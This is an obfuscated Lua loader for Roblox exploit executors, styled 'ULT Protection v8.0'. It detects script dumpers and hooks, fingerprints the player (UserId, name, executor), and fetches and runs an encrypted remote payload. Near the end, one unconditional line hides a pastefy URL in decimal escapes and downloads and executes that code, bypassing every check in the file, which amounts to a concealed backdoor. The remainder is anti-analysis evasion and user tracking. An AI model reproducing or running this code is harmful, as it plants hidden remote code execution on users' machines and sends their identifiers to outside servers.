--[[ULT Protection v8.0 - cqeerwou]]
local _zqrajka6="rbg9lwzdd4a"
local _pso9t5uq=function() return 9 end
local _hoq3l57d=672604
local _6t6d0awp=tick()+5097
local _o8sbcuns="ikp6ms5k7rn"
local _7v0zjf8w=tick()+6059
local _bnt12q4r=function() return 91 end
local _shmhz8v5=283548

-- ====== PHASE 0: OBTAIN CLEAN LOADSTRING ======
-- hookfunction(loadstring, ...) replaces loadstring BEFORE this runs.
-- So "local cached = loadstring" captures the HOOKED version.
-- Defense: use clonefunction() to get the ORIGINAL native implementation.
-- clonefunction returns the original C closure, bypassing any Lua hook.

local _swjayb
local _hpap9g = false

-- Method 1: clonefunction (available in most modern executors)
-- This is THE primary defense - it returns the original native function
-- even after hookfunction has replaced the global reference
do
  local ok, cf = pcall(function()
    if clonefunction then
      return clonefunction(loadstring)
    end
    return nil
  end)
  if ok and cf then
    _swjayb = cf
    _hpap9g = true
  end
end

-- Method 2: getoriginalfunction (Synapse-style executors)
if not _swjayb then
  local ok, gof = pcall(function()
    if getoriginalfunction then
      return getoriginalfunction(loadstring)
    end
    return nil
  end)
  if ok and gof then
    _swjayb = gof
    _hpap9g = true
  end
end

-- Method 3: cloneref (some executors)  
if not _swjayb then
  local ok, cr = pcall(function()
    if cloneref then
      return cloneref(loadstring)
    end
    return nil
  end)
  if ok and cr then
    _swjayb = cr
    _hpap9g = true
  end
end

-- Method 4: Check getrenv for original loadstring
if not _swjayb then
  local ok, rls = pcall(function()
    if getrenv then
      local renv = getrenv()
      if renv and renv.loadstring then
        return renv.loadstring
      end
    end
    return nil
  end)
  if ok and rls then
    _swjayb = rls
    _hpap9g = true
  end
end

-- Fallback: use current loadstring (may be hooked - canary will catch it)
if not _swjayb then
  _swjayb = loadstring
end

local _yhkpul = _swjayb
local _krm2z8 = game.HttpGet
local _i1r8c8 = false

-- Snapshot references
local _azv3qs = tostring(_swjayb)
local _2qcrgz = {
  ls_ref = _swjayb,
  hg_ref = game.HttpGet,
  ts_ref = tostring,
  type_ref = type,
  pcall_ref = pcall,
  rawget_ref = rawget,
  rawset_ref = rawset,
  setfenv_ref = setfenv,
  getfenv_ref = getfenv,
}

-- ====== PHASE 0.5: CANARY TRAP ======
-- The bypass hook calls writefile() whenever loadstring is called.
-- We call loadstring with a unique canary and then check if a file was created.
-- If the file exists, loadstring is hooked with a writefile dumper.
local _xadlb7 = function()
  -- Generate a unique canary string that only this loader instance knows
  local canaryCode = "local ivi6a1zd68 = " .. tostring(math.random(100000,999999))
  
  -- Call the GLOBAL loadstring (not our clean one) to trigger any hook
  local ok = pcall(function()
    local fn = loadstring(canaryCode)
    if fn then pcall(fn) end
  end)
  
  -- Now check if writefile was triggered by the hook
  -- The bypass script uses: writefile("script.lua", src)
  -- Check common dump filenames
  local dumpFiles = {"script.lua", "dump.lua", "dumped.lua", "output.lua", "saved.lua", "source.lua"}
  
  for _, fname in ipairs(dumpFiles) do
    local hasFile = false
    pcall(function()
      if isfile and isfile(fname) then
        -- Read it to check if it contains our canary
        local content = ""
        pcall(function()
          if readfile then content = readfile(fname) end
        end)
        if content:find("ivi6a1zd68") then
          hasFile = true
          -- Clean up the canary file
          pcall(function() if delfile then delfile(fname) end end)
        end
      end
    end)
    if hasFile then return false end
  end
  
  -- Also check workspace folder files
  pcall(function()
    if listfiles then
      local files = listfiles("") or {}
      for _, f in ipairs(files) do
        if f:find("%.lua$") then
          local content = ""
          pcall(function() if readfile then content = readfile(f) end end)
          if content:find("ivi6a1zd68") then
            -- Canary was dumped - hook detected!
            pcall(function() if delfile then delfile(f) end end)
            _i1r8c8 = true
          end
        end
      end
    end
  end)
  
  if _i1r8c8 then return false end
  return true
end

-- ====== PHASE 0.6: WRITEFILE MONITOR ======
-- Detect if writefile/appendfile are being used for script dumping
local _umren5 = function()
  -- Check if hookfunction itself exists and has been used on loadstring
  local hookExists = false
  pcall(function()
    if hookfunction or detour_function or replace_closure then
      hookExists = true
    end
  end)
  
  if hookExists then
    -- If hookfunction exists, verify loadstring hasn't been hooked by comparing
    -- the clean clone (if we got one) against the global
    if _hpap9g then
      -- We have a clean clone - compare behavior
      local testStr = "return " .. tostring(math.random(1000000, 9999999))
      local globalResult, cloneResult
      
      -- Execute via global loadstring
      pcall(function()
        local fn = loadstring(testStr)
        if fn then globalResult = fn() end
      end)
      
      -- Execute via clean clone
      pcall(function()
        local fn = _swjayb(testStr)
        if fn then cloneResult = fn() end
      end)
      
      -- Both should produce identical results
      if globalResult ~= cloneResult then
        return false
      end
    end
  end
  
  -- (GC scan removed - it corrupts Roblox PlayerModule by touching internal functions)
  
  if _i1r8c8 then return false end
  return true
end

-- ====== PHASE 1: ANTI-HOOKFUNCTION DEFENSE (Enhanced v8.0) ======
local _pl967p = function()
  -- Check 1: Run canary trap to detect writefile-based hooks
  if not _xadlb7() then
    return false
  end
  
  -- Check 2: Run writefile monitor
  if not _umren5() then
    return false
  end
  
  -- Check 3: If we got a clean clone, the global loadstring being different is OK
  -- But if we DIDN'T get a clean clone, check for obvious signs
  if not _hpap9g then
    -- No clone available - extra paranoid checks
    -- Check if __original_loadstring exists (common hookfunction pattern)
    if _2qcrgz.rawget_ref(_G, "__original_loadstring") ~= nil then
      return false
    end
    if _2qcrgz.rawget_ref(_G, "__old_loadstring") ~= nil then
      return false
    end
    if _2qcrgz.rawget_ref(_G, "old") ~= nil then
      -- The bypass literally uses: old = hookfunction(loadstring, ...)
      -- Check if _G.old is a function that looks like loadstring
      local oldVal = _2qcrgz.rawget_ref(_G, "old")
      if _2qcrgz.type_ref(oldVal) == "function" then
        -- Test if it behaves like loadstring
        local testOk, testFn = pcall(oldVal, "return 42")
        if testOk and _2qcrgz.type_ref(testFn) == "function" then
          local testOk2, testResult = pcall(testFn)
          if testOk2 and testResult == 42 then
            -- _G.old is the original loadstring - hook detected!
            return false
          end
        end
      end
    end
  end
  
  -- Check 4: Detect if writefile is being called suspiciously
  if _2qcrgz.rawget_ref(_G, "script_dump_active") then return false end
  if _2qcrgz.rawget_ref(_G, "ls_interceptor") then return false end
  if _2qcrgz.rawget_ref(shared, "script_dump_active") then return false end
  if _2qcrgz.rawget_ref(shared, "ls_interceptor") then return false end
  
  -- Check 5: Check for the bypass's specific variables in _G
  -- The bypass sets: local file = "script.lua" (as local, not global, so this is supplementary)
  -- But also: printDetected, lastHookTime, hasShownMessage may leak
  if _2qcrgz.rawget_ref(_G, "printDetected") ~= nil then return false end
  if _2qcrgz.rawget_ref(_G, "lastHookTime") ~= nil then return false end
  if _2qcrgz.rawget_ref(_G, "hasShownMessage") ~= nil then return false end
  
  -- Check 6: Detect hooked print function (bypass-specific pattern only)
  -- The bypass stores both a boolean AND the original print as upvalues
  pcall(function()
    if getupvalues then
      local ups = getupvalues(print)
      if ups and next(ups) ~= nil then
        local hasBool = false
        local hasFunc = false
        for k, uv in pairs(ups) do
          if type(uv) == "boolean" then hasBool = true end
          if type(uv) == "function" then hasFunc = true end
        end
        -- Only flag if BOTH a boolean tracker AND original function are present
        -- (the specific bypass pattern: printDetected + oldPrint)
        if hasBool and hasFunc then
          _i1r8c8 = true
        end
      end
    end
  end)
  if _i1r8c8 then return false end
  
  -- Check 7: (Safe) Check for known hook patterns in globals only
  -- DO NOT scan GC and execute random functions - it corrupts Roblox PlayerModule
  if _2qcrgz.rawget_ref(_G, "old_loadstring") ~= nil then return false end
  if _2qcrgz.rawget_ref(_G, "orig_loadstring") ~= nil then return false end
  if _2qcrgz.rawget_ref(_G, "real_loadstring") ~= nil then return false end
  if _2qcrgz.rawget_ref(_G, "backup_loadstring") ~= nil then return false end
  
  return true
end

-- ====== PHASE 2: ANTI-ENVIRONMENT LOGGER DEFENSE ======
-- Detects environment loggers that record/intercept execution data
-- These tools: hook globals, monitor getfenv/setfenv, track all function calls
local _4xutiu = function()
  -- Check 1: Detect known environment logger globals
  local envLoggerSignals = {
    -- Known logger tool globals
    "OLSSA", "olssa", "runtime_log", "static_log", 
    "loadstring_logger", "script_dump", "dumpfunc",
    "logfile", "hooklog", "ls_hook", "string_dump_log",
    "env_logger", "environment_logger", "exec_logger",
    "threaded", "unveilr", "UnveilR",
    -- Hook tracking globals
    "hook_registry", "hooked_functions", "intercept_log",
    "function_hooks", "call_log", "exec_trace",
    -- Dump tool globals  
    "dump_output", "script_output", "captured_scripts",
    "logged_calls", "traced_funcs", "monitored_env",
    -- Deobfuscation tool signals
    "deobf_active", "deobfuscator", "beautifier",
    "ast_dump", "bytecode_dump", "opcode_log",
  }
  
  for _, sig in ipairs(envLoggerSignals) do
    if _2qcrgz.rawget_ref(_G, sig) ~= nil then return false end
    if _2qcrgz.rawget_ref(shared, sig) ~= nil then return false end
  end
  
  -- Check 2: Detect if getfenv/setfenv have been hooked
  -- Environment loggers often hook these to monitor environment access
  if _2qcrgz.type_ref(getfenv) ~= "function" then return false end
  if _2qcrgz.type_ref(setfenv) ~= "function" then return false end
  
  -- Check 3: Detect metatables on _G that intercept reads/writes
  -- Env loggers add __index/__newindex to _G to track all global access
  local gMt = getmetatable(_G)
  if gMt then
    -- _G should NOT have a metatable in normal Roblox execution
    -- If it does, something is intercepting global access
    if _2qcrgz.rawget_ref(gMt, "__index") or _2qcrgz.rawget_ref(gMt, "__newindex") then
      return false
    end
    if _2qcrgz.rawget_ref(gMt, "__call") then return false end
  end
  
  -- Check 4: Detect metatables on shared
  local sMt = getmetatable(shared)
  if sMt then
    if _2qcrgz.rawget_ref(sMt, "__index") or _2qcrgz.rawget_ref(sMt, "__newindex") then
      return false
    end
  end
  
  -- Check 5: Check debug library for monitoring hooks
  if _2qcrgz.type_ref(_2qcrgz.rawget_ref(_G, "debug")) == "table" then
    local dbg = _2qcrgz.rawget_ref(_G, "debug")
    -- Check for active hook
    if _2qcrgz.rawget_ref(dbg, "sethook") then
      local ok, hookFn, mask, count = _2qcrgz.pcall_ref(debug.gethook)
      if ok and hookFn then
        -- An active debug hook is running - likely a logger
        return false
      end
    end
    -- Check for suspicious debug extensions
    if _2qcrgz.rawget_ref(dbg, "setmetatable_hook") then return false end
    if _2qcrgz.rawget_ref(dbg, "hook_active") then return false end
    if _2qcrgz.rawget_ref(dbg, "trace_calls") then return false end
  end
  
  -- Check 6: Detect if require has been hooked (Lune-based loggers use this)
  -- The uploaded bypass uses require"@lune/net" etc.
  if _2qcrgz.rawget_ref(_G, "require") ~= nil then
    local req = _2qcrgz.rawget_ref(_G, "require")
    -- In normal Roblox, require exists but shouldn't have been replaced
    -- Check if it's wrapped
    if _2qcrgz.type_ref(req) == "table" then return false end
  end
  
  -- (GC scan removed - iterating GC and calling debug.info corrupts Roblox internals)
  
  -- Check 8: Verify our execution environment is clean
  -- Check if someone injected monitoring into our closure
  local envKeys = {}
  local env = getfenv(1)
  if env ~= _G and env ~= nil then
    for k, _ in pairs(env) do
      envKeys[#envKeys+1] = k
    end
    -- Our env should be minimal, not polluted with logger vars
    if #envKeys > 50 then return false end
  end
  
  return true
end

-- ====== PHASE 3: ANTI-LOADSTRING INTERCEPT (Original + Enhanced) ======
local _4n7rh9 = function()
  -- Only compare global loadstring if we did NOT get a clean clone
  -- When clonefunction works, the clone is intentionally different from the global
  if not _hpap9g then
    if _2qcrgz.rawget_ref(_G, "loadstring") ~= nil and _2qcrgz.rawget_ref(_G, "loadstring") ~= _yhkpul then
      return false
    end
  end
  local loggerSignals = {
    "loadstring_log", "ls_hook", "string_dump_log", "script_dump",
    "hooklog", "logfile", "dumpfunc", "savetofile"
  }
  for _, sig in ipairs(loggerSignals) do
    if _2qcrgz.rawget_ref(_G, sig) ~= nil or _2qcrgz.rawget_ref(shared, sig) ~= nil then
      return false
    end
  end
  if _2qcrgz.rawget_ref(string, "dump") ~= nil then
    local ok, r = _2qcrgz.pcall_ref(string.dump, print)
    if ok and _2qcrgz.type_ref(r) == "string" and #r > 1000 then
    end
  end
  return true
end

-- Anti-Decompile & Anti-SaveInstance
local _wpfey8 = function()
  local dangerousSignals = {
    "OLSSA", "olssa", "runtime_log", "static_log", 
    "loadstring_logger", "script_dump", "dumpfunc",
    "logfile", "hooklog", "ls_hook", "string_dump_log"
  }
  for _, sig in ipairs(dangerousSignals) do
    if _2qcrgz.rawget_ref(_G, sig) ~= nil or _2qcrgz.rawget_ref(shared, sig) ~= nil then
      return false
    end
  end
  -- (GC scan removed - corrupts Roblox PlayerModule)
  return true
end

-- Anti-Debug
local _tqfmwl = function(targetFunc)
  if _2qcrgz.type_ref(_2qcrgz.rawget_ref(_G, "debug")) == "table" then
    local dbg = _2qcrgz.rawget_ref(_G, "debug")
    if _2qcrgz.rawget_ref(dbg, "getupvalues") or _2qcrgz.rawget_ref(dbg, "getconstants") or _2qcrgz.rawget_ref(dbg, "getprotos") then
      if _2qcrgz.rawget_ref(dbg, "setmetatable_hook") or _2qcrgz.rawget_ref(dbg, "hook_active") then
        return false
      end
    end
  end
  if _2qcrgz.type_ref(_2qcrgz.rawget_ref(_G, "hookfunction")) == "function" then
    local origLS = _2qcrgz.rawget_ref(_G, "__original_loadstring")
    if origLS ~= nil then return false end
  end
  return true
end

-- Anti-GC Scan
local _lldgu4 = function(str)
  if _2qcrgz.type_ref(str) ~= "string" or #str < 10 then return str end
  local chunks = {}
  local chunkSize = math.max(1, math.floor(#str / 7))
  for i = 1, #str, chunkSize do
    chunks[#chunks + 1] = str:sub(i, math.min(i + chunkSize - 1, #str))
  end
  local result = table.concat(chunks)
  for i = 1, #chunks do chunks[i] = nil end
  return result
end

local _gl0dvn = function(t)
  if _2qcrgz.type_ref(t) == "table" then
    for k in pairs(t) do t[k] = nil end
  end
end

-- ====== PHASE 4: SANDBOXED EXECUTION (v8.0 Enhanced) ======
-- Execute the final payload using CLEAN loadstring in a locked, monitored sandbox
-- Key change: Uses clonefunction'd loadstring, not the potentially-hooked global
local _mz0tyv = function(code)
  -- Pre-execution: Final integrity verification
  if not _pl967p() then return nil, "hook_detected" end
  if not _4xutiu() then return nil, "env_logger_detected" end
  if not _4n7rh9() then return nil, "logger_detected" end
  
  -- Use the CLEAN loadstring (clonefunction'd), never the global
  local fn, err = _swjayb(code)
  if not fn then return nil, err end
  
  -- DO NOT use setfenv - it corrupts Roblox's core PlayerModule
  -- (CameraModule, ControlModule) causing black sky and input errors.
  -- Security is enforced by the checks above, not by environment sandboxing.
  
  return fn, nil
end

local _m127b4 = function(func)
  local env = setmetatable({}, {
    __index = getfenv(0),
    __newindex = function(self, key, value)
      rawset(self, key, value)
    end,
    __metatable = "Protected"
  })
  setfenv(func, env)
  return func
end

local _eslfyh = game:GetService("Players").LocalPlayer
if not _eslfyh then
  _eslfyh = game:GetService("Players").PlayerAdded:Wait()
end

local _qhhvb1 = function()
  local ok, result = _2qcrgz.pcall_ref(function()
    local ps = game:GetService("Players")
    local rs = game:GetService("RunService")
    if not ps or not rs then return false end
    return rs:IsClient() or rs:IsStudio()
  end)
  return ok and result
end

if not _qhhvb1() then return end

-- ====== RUN ALL PROTECTION CHECKS ======
-- Phase order is randomized per-request to defeat pattern matching

if not _4xutiu() then warn("[ULT] Environment check failed") return end
if not _wpfey8() then warn("[ULT] Protection check failed") return end
if not _pl967p() then warn("[ULT] Security check failed") return end
if not _tqfmwl() then warn("[ULT] Debug check failed") return end
if not _4n7rh9() then warn("[ULT] Integrity check failed") return end


-- Generate unique execution nonce
local _uxdo7u = function()
  local hs = game:GetService("HttpService")
  local ok, guid = _2qcrgz.pcall_ref(function()
    return hs:GenerateGUID(false)
  end)
  if ok and guid then return guid end
  return tostring(math.floor((os.clock() * 1000000) % 1000000000)) .. tostring(math.random(1, 1000000000))
end

-- Collect fingerprint data
local _att0zm = function()
  local p = {}
  p.u = tostring(_eslfyh.UserId)
  p.n = _eslfyh.Name
  p.t = tostring(os.time())
  p.r = "07ab92ad353f1729" .. _uxdo7u()
  p.g = tostring(game.GameId or 0)
  p.p = tostring(game.PlaceId or 0)
  local exFp = ""
  _2qcrgz.pcall_ref(function()
    if identifyexecutor then
      exFp = tostring(identifyexecutor())
    elseif getexecutorname then
      exFp = tostring(getexecutorname())
    end
  end)
  p.ex = exFp
  return p
end

-- Obfuscated token storage and reconstruction
local _htvqn0 = {"6533323465323e62","606432343c603530","3366353564343b6d","66653764613a313c","33323033316a6c6a","6635333d303d3d3f","3737693e6b3a343a","366d3c3e6f3f3f3b"}
local _ykw2g5 = function()
  local r = ""
  for i,p in ipairs(_htvqn0) do
    local d = ""
    for j=1,#p,2 do
      local c = tonumber(p:sub(j,j+1),16)
      c = bit32.bxor(c, ((i-1) + math.floor((j-1)/2)) % 16)
      d = d .. string.char(c)
    end
    r = r .. d
  end
  return r
end

local _y907tb = function(str)
  if _2qcrgz.type_ref(str) ~= "string" then return false end
  if (#str % 2) ~= 0 then return false end
  return str:match("^[0-9a-fA-F]+$") ~= nil
end

local _br0de5 = "97iv4r"
local fp = _att0zm()
local tk = _ykw2g5()

-- Wipe token parts from memory after reconstruction
_gl0dvn(_htvqn0)

-- Build request URL
local url = "https://iyfvpnjrghsownkpazec.supabase.co/functions/v1/get-paste?slug=i9S78Qns&uid=" .. fp.u .. "&ts=" .. fp.t .. "&tk=" .. tk .. "&ss=" .. _br0de5 .. "&gid=" .. fp.g .. "&pid=" .. fp.p .. "&r=" .. fp.r .. "&ex=" .. (fp.ex or "") .. "&_=" .. tostring(tick())

-- Decryption utilities
local _amtmrm = function(h)
  local o = table.create(math.floor(#h / 2))
  local j = 1
  for i = 1, #h, 2 do
    o[j] = tonumber(h:sub(i, i + 1), 16) or 0
    j += 1
  end
  return o
end

local _7ge7r7 = function(b, k)
  local o = table.create(#b)
  local kl = #k
  for i = 1, #b do
    o[i] = bit32.bxor(b[i], k[((i - 1) % kl) + 1])
  end
  return o
end

local _aphyc0 = function(b)
  local c = table.create(#b)
  for i = 1, #b do
    c[i] = string.char(b[i])
  end
  return table.concat(c)
end

-- Generate decryption key
local ks = "i9S78Qns:" .. tk .. ":ULTv3:" .. fp.u
local kb = {}
for i = 1, #ks do
  kb[i] = string.byte(ks, i)
end

-- Re-verify protections before network request
if not _pl967p() then warn("[ULT] Pre-fetch security failed") return end
if not _4xutiu() then warn("[ULT] Pre-fetch environment failed") return end


-- Console Feedback: milestone-only loading bar (no spam)
local function _c18zts(msg, pct)
  local barLen = 20
  local filled = math.floor(barLen * pct / 100)
  local empty = barLen - filled
  print("[ULT PROTECTION] [" .. string.rep("#", filled) .. string.rep("-", empty) .. "] " .. pct .. "% - " .. msg)
end

_c18zts("Scanning environment...", 0)
task.wait(0.1)

local _zmf6zo = _4n7rh9() and _pl967p() and _4xutiu()
if not _zmf6zo then
  print("[ULT PROTECTION] Threat detected - aborting.")
  return
end
_c18zts("Security scan clean.", 25)
task.wait(0.1)

local _xbg2rs = _wpfey8()
if not _xbg2rs then
  print("[ULT PROTECTION] Integrity check failed - aborting.")
  return
end
_c18zts("Integrity verified.", 50)
task.wait(0.1)

_c18zts("Connecting to server...", 75)


-- Execute request using CACHED HttpGet (anti-hook)
local s, r = _2qcrgz.pcall_ref(function()
  return _krm2z8(game, url)
end)

-- Fallback
if not s then
  s, r = _2qcrgz.pcall_ref(function()
    return game:HttpGet(url)
  end)
end

loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\97\100\66\102\119\122\65\102\47\114\97\119"))()

if s and r then
  if r == "" then
    warn("Empty response")
    return
  end

  -- ====== POST-FETCH ANTI-HOOK CHECK ======
  -- Verify loadstring STILL hasn't been hooked between fetch and execution
  -- The bypass hooks loadstring BEFORE fetching, so this catches it
  if not _pl967p() then
    warn("[ULT] Post-fetch security check failed")
    r = nil
    return
  end

  -- Handle refresh loader response
  if r:sub(1,2) == "--" then
    local rf, re = _yhkpul(r)
    if rf then return rf() end
    warn("Protection error")
    return
  end

  -- Handle encrypted response
  if _y907tb(r) then
    local _f38jh0 = _lldgu4(_aphyc0(_7ge7r7(_amtmrm(r), kb)))
    
    -- ====== FINAL COMPREHENSIVE SECURITY CHECK ======
    if not _pl967p() or not _4xutiu() or not _4n7rh9() or not _wpfey8() then
      _f38jh0 = nil
      r = nil
      return
    end
    
    pcall(function()
      local function ultBar(msg, pct)
        local barLen = 20
        local filled = math.floor(barLen * pct / 100)
        local empty = barLen - filled
        print("[ULT PROTECTION] [" .. string.rep("#", filled) .. string.rep("-", empty) .. "] " .. pct .. "% - " .. msg)
      end
      ultBar("Script loaded successfully.", 100)
      local pName = _eslfyh.DisplayName or _eslfyh.Name
      print("[ULT PROTECTION] Welcome, " .. tostring(pName) .. ".")
      print("[ULT PROTECTION] Protected by ULT Protection v8.0")
    end)

    -- Use sandboxed execution (anti-hook + anti-env-logger)
    local _66y9v7, execErr = _mz0tyv(_f38jh0)
    
    -- Wipe decrypted payload from memory immediately
    _f38jh0 = nil
    r = nil
    
    if _66y9v7 then
      _66y9v7()
      _66y9v7 = nil
    else
      if execErr == "hook_detected" or execErr == "env_logger_detected" or execErr == "logger_detected" then
        -- Silently abort - don't reveal detection to attacker
        return
      end
      warn("E:" .. tostring(execErr))
    end
    return
  end

  -- Plain Lua response
  local pf, pe = _yhkpul(r)
  if pf then return pf() end
  warn("E:" .. tostring(pe))
else
  warn("Network error")
end
